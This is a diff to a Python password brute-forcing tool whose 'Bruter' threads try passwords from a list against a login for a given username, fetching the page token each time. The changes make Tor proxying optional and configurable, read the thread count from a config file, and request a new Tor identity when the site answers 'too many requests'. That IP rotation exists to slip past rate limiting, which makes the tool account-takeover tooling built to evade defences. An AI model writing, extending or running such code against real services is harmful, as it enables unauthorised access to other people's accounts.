@@ -36,10 +36,13 @@ class Bruter(threading.Thread):
         self.__running = True
         # self.__notifier = notifier
         
-        # parse config:
-        self.__tor_control_port = int(config['TorControlPort'])
-        self.__tor_control_port_password = config['TorControlPortPassword']
-        self.__tor_socks_port = config['TorSocksPort']
+        # parse config (if you want to add any config, do it here):
+        self.__use_tor = False if config['usetor'] == '0' else True
+        if self.__use_tor:
+            self.__tor_hostname = config['torhostname']
+            self.__tor_control_port = int(config['torcontrolport'])
+            self.__tor_control_port_password = config['torcontrolportpassword']
+            self.__tor_socks_port = config['torsocksport']
 
     def next_password(self):
         with self.__lock:
@@ -71,11 +74,15 @@ class Bruter(threading.Thread):
         sleep(10)
 
     def auth(self, password):
+        
         # initialize proxy:
-        proxy = {
-            'http' : 'socks5://localhost:%s' % self.__tor_socks_port,
-            'https' : 'socks5://localhost:%s' % self.__tor_socks_port
-        }
+        proxy = None
+        if self.__use_tor:
+            proxy = {
+                'http' : 'socks5://%s:%s' % (self.__tor_hostname, self.__tor_socks_port),
+                'https' : 'socks5://%s:%s' % (self.__tor_hostname, self.__tor_socks_port)
+            }
+        
         while self.__running:
             # first, GET the home page and obtain the token
             try:
@@ -139,7 +146,8 @@ class Bruter(threading.Thread):
                 # Should change ip
                 # self.__notifier.notify(msg = 'Too many requests. Requesting new Tor identity...')
                 self.__on_error(Bruter.ERR_TOO_MANY_REQUESTS)
-                self.get_new_tor_identity()
+                if self.__use_tor:
+                    self.get_new_tor_identity()
                 continue
 
     def run(self):
@@ -158,9 +166,10 @@ class Bruter(threading.Thread):
         self.__running = False
 
 class Attacker():
-    def __init__(self, username, passlist, thread_count):
-        # self.__username = username
-        self.__thread_count = thread_count
+    def __init__(self, username, passlist):
+        # defaults
+        self.__thread_count = 1
+        self.__use_tor = False
         self.__username = username
 
         with open(file = passlist, mode = 'r') as passlist_file:
@@ -177,8 +186,12 @@ class Attacker():
                 line = line.split(' ')
                 if len(line) != 2:
                     continue
-                key, value = line[0], line[1][:-1] # should remove the \n at the end of the line
-                self.__config[key] = value
+                key, value = line[0].lower(), line[1][:-1] # should remove the \n at the end of the line
+                # extract needed configs
+                if key == 'threadcount':
+                    self.__thread_count = int(value)
+                else:
+                    self.__config[key] = value
         
         # keeps a list of bruter objects
         self.__bruters = []
